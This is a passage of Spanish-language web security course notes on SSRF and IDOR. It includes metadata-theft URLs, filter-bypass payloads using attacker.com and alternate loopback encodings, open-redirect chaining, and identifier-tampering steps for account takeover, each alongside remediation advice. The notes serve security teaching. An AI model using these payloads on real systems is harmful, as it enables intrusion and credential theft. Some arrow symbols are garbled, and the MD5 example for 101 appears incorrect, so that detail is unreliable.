**SSRF Ciego (Blind SSRF):** La solicitud saliente se realiza con éxito hacia el objetivo interno, pero la aplicación web no muestra el contenido de la respuesta al usuario. Debe confirmarse mediante interacciones fuera de banda (DNS/HTTP callbacks en herramientas como Burp Collaborator) o analizando diferencias de tiempos de respuesta.

<br>

### 4.2 Impacto de SSRF y Entornos Cloud
El impacto de una vulnerabilidad SSRF varía en función de la arquitectura de la red interna alcanzable desde el servidor backend:

* **Acceso a Interfaces y Paneles Internos:** Permite interactuar con paneles de administración, interfaces de configuración o herramientas de monitoreo locales (`http://localhost/admin` o `http://127.0.0.1:8080`) que no están expuestas a Internet y que confían en las peticiones locales.
* **Exposición de Datos Confidenciales:** Acceso a bases de datos internas, servicios REST privados y herramientas que devuelven registros de clientes, información del sistema o claves de configuración.
* **Reconocimiento de Red Interna:** Mediante el envío masivo de solicitudes a diferentes direcciones IP privadas (rangos `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) y puertos específicos, el atacante puede mapear la topología de la red interna analizando los códigos de estado HTTP y los tiempos de respuesta.
* **Robo de Metadatos en la Nube (Cloud Metadata Exfiltration):** Los proveedores de infraestructura cloud (AWS, Google Cloud, Microsoft Azure, DigitalOcean) exponen un servicio de metadatos de instancia accesible internamente en la IP no enrutable **`169.254.169.254`**. Un atacante que explote SSRF hacia esta dirección puede consultar las credenciales temporales de seguridad y tokens de roles IAM:
  ```http
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```
* **Fuga de Tokens y Credenciales:** Interceptación de tokens de autorización transmitidos entre microservicios internos que operan sobre HTTP sin cifrar.

<br>

### 4.3 Ejemplos de Vectores SSRF
La forma en que la entrada del usuario se incorpora a la solicitud del lado del servidor determina la técnica de explotación:

#### Vector 1: URL Completa en un Parámetro
Es la forma más directa de SSRF. La aplicación recibe una URL completa en un parámetro de consulta (ejemplo: `https://website.thm/stock?server=http://api.internal/item?id=2`).
*Ataque:* El atacante modifica el valor del parámetro para apuntar a un recurso sensible e inyecta un parámetro nulo (`&x=`) para neutralizar cualquier sufijo añadido por la aplicación:
  ```http
  https://website.thm/stock?server=http://127.0.0.1/admin?x=
  ```

#### Vector 2: URL Parcial (Solo Nombre de Host o Dominio)
La aplicación acepta únicamente el nombre de host o dominio y construye la ruta en el backend (`https://[PARAMETRO_USUARIO]/stock/item`).
*Ataque:* Si no hay validación, el atacante sustituye el nombre de host por un dominio bajo su control (`attacker.com`) para capturar la petición saliente o por un host interno.

#### Vector 3: Path Traversal en la URL
La aplicación fija el esquema y el dominio (`https://api.internal/data/`), pero permite al usuario controlar el segmento final de la ruta.
*Ataque:* El atacante utiliza secuencias de salto de directorio (`/../`) para navegar fuera del directorio previsto y acceder a endpoints privilegiados:
  ```http
  https://website.thm/api/view?path=/../../admin/settings
  ```

#### Vector 4: Campos de Formulario Ocultos
Vectores que no son visibles en la barra de URL pero existen en el código fuente HTML o peticiones JSON (ejemplo: un campo oculto `<input type="hidden" name="avatar_path" value="http://website.thm/avatars/user.png">`). Al modificar el campo mediante Burp Suite, el servidor procesa la descarga desde la ruta inyectada.

### 4.4 Identificación y Confirmación de SSRF
#### Funcionalidades Habitualmente Vulnerables a SSRF:
Configuración de Webhooks de notificación.
Generación automatizada de archivos PDF e informes a partir de una URL.
Vista previa de enlaces o despliegue de metadatos (previsualización de tarjetas en redes sociales).
Funciones de importación de archivos remotos desde una URL.
Integraciones con servicios de terceros.

#### Métodos para Confirmar SSRF Ciego (Blind SSRF):
**Registrador HTTP Externo (RequestBin):** Enviar como payload una URL generada en RequestBin y comprobar en el panel si llegan peticiones provenientes de la IP del servidor de destino.
**Burp Collaborator:** Generar un subdominio único que registra conexiones entrantes HTTP y búsquedas DNS. Es útil cuando el tráfico HTTP está bloqueado pero la resolución DNS sigue funcionando.
**Oyente Autohospedado:** Ejecutar un servidor web simple en la máquina del auditor (`python3 -m http.server 8080`) y verificar las solicitudes salientes.
**Análisis de Tiempos y Diagnóstico Basado en Errores:** Comparar las diferencias en el tiempo de respuesta y mensajes de error al solicitar IPs internas que existen versus las que no existen.

### 4.5 Anulación de Defensas Comunes de SSRF (*Bypasses*)
Los desarrolladores intentan aplicar filtros para proteger sus aplicaciones contra SSRF. A continuación se detallan las técnicas para eludir las tres defensas más comunes:

#### 1. Elusión de Listas de Denegación (*Deny Lists Bypasses*)
Una lista de denegación bloquea palabras o IPs específicas como `127.0.0.1` o `localhost`. Sin embargo, las direcciones IP poseen múltiples representaciones alternativas que eludieron los filtros de cadenas:

| Representación | Ejemplo de Payload | Mecanismo de Funcionamiento |
| :--- | :--- | :--- |
| **Estándar** | `http://127.0.0.1` | Dirección IP loopback estándar. |
| **Decimal** | `http://2130706433` | Conversión entera de 32 bits de 127.0.0.1. |
| **Octal** | `http://017700000001` | Representación octal con ceros a la izquierda. |
| **Abreviada** | `http://127.1` o `http://0` | Formato corto equivalente a 127.0.0.1. |
| **Comodín** | `http://127.*.*.*` | Cualquier rango del bloque 127. |
| **IPv6** | `http://[::1]` | Dirección loopback en IPv6. |
| **DNS Comodín** | `http://127.0.0.1.nip.io` | Servicio DNS que resuelve cualquier subdominio hacia la IP indicada. |

*Bypass de Metadatos Cloud (`169.254.169.254`):* Se registra un dominio propio con un registro DNS tipo A que apunta a `169.254.169.254`. El filtro valida el nombre de dominio en la lista de denegación, permite la solicitud y el servidor resuelve la IP saliente hacia el endpoint de metadatos.

#### 2. Elusión de Listas de Permitidos (*Allow Lists Bypasses*)
Una lista de permitidos deniega todo por defecto salvo que la URL empiece por un dominio aprobado (ejemplo: `https://website.thm`).
**Coincidencia de Subdominios:** Registrar un dominio propio donde la cadena inicial coincida con el nombre de confianza:
  `https://website.thm.attacker.com`
**Abuso de Credenciales de URL con el Carácter `@`:** Las bibliotecas HTTP interpretan el texto anterior al carácter `@` como credenciales de usuario y lo posterior como el nombre de host real:
  `https://website.thm@attacker.com/` (El filtro lee `website.thm`, pero la petición va a `attacker.com`).

#### 3. Encadenamiento con Redirecciones Abiertas (*Open Redirects*)
Si las listas de permitidos no pueden eludirse directamente, se busca una vulnerabilidad de Redirección Abierta (*Open Redirect*) dentro de un dominio legítimo permitido (`http://website.thm/redirect?url=http://169.254.169.254`). Al enviar esta URL al endpoint vulnerable a SSRF, la lista de permitidos autoriza la petición inicial a `website.thm` y el cliente HTTP del backend sigue automáticamente la redirección `302` hacia la IP privada.

### 4.6 Remediación y Prevención de SSRF
**Listas de Permitidos Estrictas (*Allowlists*):** Validar que las solicitudes del lado del servidor se dirijan exclusivamente a nombres de dominio e IP explícitamente autorizados mediante análisis estructural (*parsing*) de la URL.
**Deshabilitar el Seguimiento de Redirecciones HTTP:** Configurar el cliente HTTP del servidor para que no siga automáticamente respuestas de redirección `301` o `302`.
**Validación de IP tras Resolución DNS:** Resolver el nombre de dominio a una dirección IP antes de emitir la petición y verificar que dicha IP no pertenezca a rangos reservados o privados (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`).


## 5. Referencias Directas Inseguras a Objetos (IDOR)

### 5.1 ¿Qué es IDOR?
Las aplicaciones web utilizan identificadores (números, cadenas o claves) para hacer referencia a recursos almacenados en sus bases de datos (perfiles de usuario, facturas, tickets de soporte, documentos privados). Una **Referencia Directa Insegura a Objetos (Insecure Direct Object Reference - IDOR)** ocurre cuando una aplicación permite al usuario proporcionar un identificador para acceder a un recurso y el servidor procesa la solicitud recuperando el objeto sin verificar si el usuario actual tiene permisos o autorización sobre él.

IDOR es una falla de control de acceso categorizada en el puesto **A01:2021 - Broken Access Control** del OWASP Top 10 y bajo el nombre **BOLA (Broken Object Level Authorization)** en el OWASP API Security Top 10. Aunque la terminología varía, la causa raíz es idéntica: el servidor no valida que el usuario autenticado sea el propietario del objeto solicitado.

### 5.2 Ejemplo Práctico y Brecha entre Autenticación y Autorización
Considere un usuario que inicia sesión y navega a su perfil de usuario en la URL:
`https://website.thm/profile?user_id=1305`

El parámetro `user_id=1305` le indica al servidor qué registro consultar en la base de datos para mostrar el nombre, correo y teléfono del usuario. 

Si el usuario modifica manualmente la URL en la barra de direcciones cambiando el identificador:
`https://website.thm/profile?user_id=1000`

Si la aplicación responde mostrando el perfil completo de otro usuario, la web presenta una vulnerabilidad IDOR.

#### La Brecha entre Autenticación y Autorización:
**Autenticación (Funciona Correctamente):** El sistema sabe quién eres porque has iniciado sesión válidamente y posees una cookie de sesión activa.
**Autorización (Falta por Completo):** El servidor carece de lógica backend que verifique: *“¿Esta sesión activa pertenece al dueño del registro 1000?”*. El servidor asume erróneamente que cualquier usuario autenticado tiene derecho a consultar cualquier objeto cuyo identificador conozca.

#### Consecuencias en Operaciones de Escritura:
IDOR no se limita a operaciones de lectura (`GET`). Si el endpoint vulnerable procesa cambios mediante peticiones `POST` o `PUT` (por ejemplo, `POST /update-email` con el cuerpo `{"user_id": 1000, "email": "attacker@evil.com"}`), un atacante puede modificar la clave o el correo de cualquier usuario, logrando la **toma de control total de la cuenta (*Account Takeover*)**.

### 5.3 Descubrimiento de IDORs según el Tipo de Identificador
Los desarrolladores a menudo intentan proteger los identificadores aplicando codificación o hashing. Sin embargo, estas técnicas no sustituyen al control de acceso:

#### 1. Identificadores Secuenciales o en Texto Plano
Parámetros numéricos directos (`user_id=105`, `invoice_id=1002`). Son los más fáciles de descubrir y explotar mediante enumeración e incremento numérico directo (`105` $
ightarrow$ `106`).

#### 2. Identificadores Codificados (Base64)
Los desarrolladores codifican valores numéricos o estructuras JSON antes de incluirlos en parámetros o cookies. Por ejemplo, la estructura `{"user_id": 5}` codificada en Base64 aparece como `eyJ1c2VyX2lkIjogNX0=`.
*Metodología de Explotación en 4 Pasos:*
Decodificar la cadena Base64 mediante herramientas como Burp Decoder o la consola (`echo 'eyJ...' | base64 -d`).
Modificar el identificador en el texto decodificado (`{"user_id": 1}`).
Recodificar el nuevo valor en Base64 (`echo '{"user_id": 1}' | base64`).
Sustituir la cadena codificada en la petición HTTP y enviarla.

*Nota:* Base64 es un esquema de codificación reversible, no un algoritmo de cifrado. No aporta ninguna seguridad.

#### 3. Identificadores Hasheados (MD5, SHA-1, SHA-256)
Aparecen como cadenas hexadecimales de longitud fija (MD5: 32 caracteres, SHA-1: 40 caracteres, SHA-256: 64 caracteres). Si la entrada utilizada para generar el hash es predecible (como números enteros secuenciales), un atacante puede calcular los hashes correspondientes e inyectarlos.
*Ejemplo:* Si el parámetro de perfil usa `md5(100)` $
ightarrow$ `f899139df5e1059396431415e770c6dd`, el atacante calcula `md5(101)` $
ightarrow$ `29b2272f66cf1c49bf457b05b82ba7b6` y lo sustituye en la solicitud.

#### 4. Identificadores Impredecibles / UUIDs y la Técnica de Dos Cuentas
Los identificadores únicos universales (UUIDs, tipo `d3b07384-d9a0-4e9b-8b3c-2f1a6c7e4a90`) son cadenas aleatorias que no pueden enumerarse secuencialmente. Sin embargo, **un UUID impredecible NO elimina la vulnerabilidad IDOR**, únicamente impide el ataque de enumeración masiva por fuerza bruta.

#### La Técnica de Auditoría de Dos Cuentas:
Para verificar un IDOR en identificadores impredecibles se utiliza el siguiente procedimiento:
Crear dos cuentas separadas en la aplicación: **Cuenta A** y **Cuenta B**.
Iniciar sesión con la **Cuenta A** y registrar los identificadores UUID únicos asociados a sus recursos privados (archivos, facturas, tickets).
Iniciar sesión con la **Cuenta B** e interceptar sus peticiones mediante Burp Suite.
Sustituir los UUIDs de la Cuenta B por los UUIDs pertenecientes a la **Cuenta A**.
Si el servidor devuelve los recursos de la Cuenta A a la sesión de la Cuenta B, la aplicación carece de control de acceso a nivel de objeto y es vulnerable a IDOR.

*Filtración de UUIDs:* Los UUIDs privados suelen filtrarse a través de URLs compartidas, respuestas de API públicas, código fuente HTML/JS, notificaciones por correo o informes CSV exportables.

### 5.4 Ubicaciones de Auditoría de IDORs
Los IDORs pueden estar presentes en cualquier punto de intercambio de datos de la aplicación:

**Peticiones HTTP en Segundo Plano (AJAX / Fetch):** Llamadas asíncronas ejecutadas por el navegador que no aparecen en la barra de direcciones de la URL (visibles en la pestaña *Network* de las herramientas de desarrollo o en el historial HTTP de Burp Suite, ejemplo: `GET /api/v1/customer?id=15`).
**Archivos JavaScript Frontend:** El análisis del código fuente JS de la aplicación suele revelar endpoints de API no documentados y parámetros internos aceptados por el backend.
**Minería de Parámetros (*Parameter Mining*):** Parámetros no expuestos en la interfaz gráfica que el backend sigue procesando por código heredado o depuración (ejemplo: agregar `?user_id=123` a una petición `GET /user/details` que normalmente no requiere parámetros).
**Ubicaciones Habituales:** Parámetros en la cadena de consulta (*Query strings*), datos del cuerpo en peticiones `POST`/`PUT`/`JSON`, valores almacenados en cookies, encabezados HTTP personalizados y segmentos de ruta de API REST (`/api/v1/users/123/orders`).

### 5.5 Remediación y Prevención de IDOR
**Autorización Explícita a Nivel de Objeto:** Comprobar obligatoriamente en el servidor backend, en cada petición individual, si el identificador de usuario asociado a la sesión activa coincide con el propietario del objeto solicitado en la base de datos:
  ```python
  # Verificación obligatoria de autorización a nivel de objeto
  if object.owner_id != current_user.id:
      raise AccessDeniedException("No tiene permisos para acceder a este recurso.")
  ```
**Uso de Referencias Indirectas Específicas de Sesión:** Reemplazar las claves primarias de la base de datos por identificadores indirectos e imprescincibles mapeados temporalmente dentro de la sesión del usuario (por ejemplo, mapear la factura real `1005` a la clave local `1` en el diccionario de sesión del usuario).
**Control de Acceso Basado en Roles (RBAC):** Definir políticas centralizadas de permisos para restringir las operaciones permitidas según el rol del usuario autenticado.
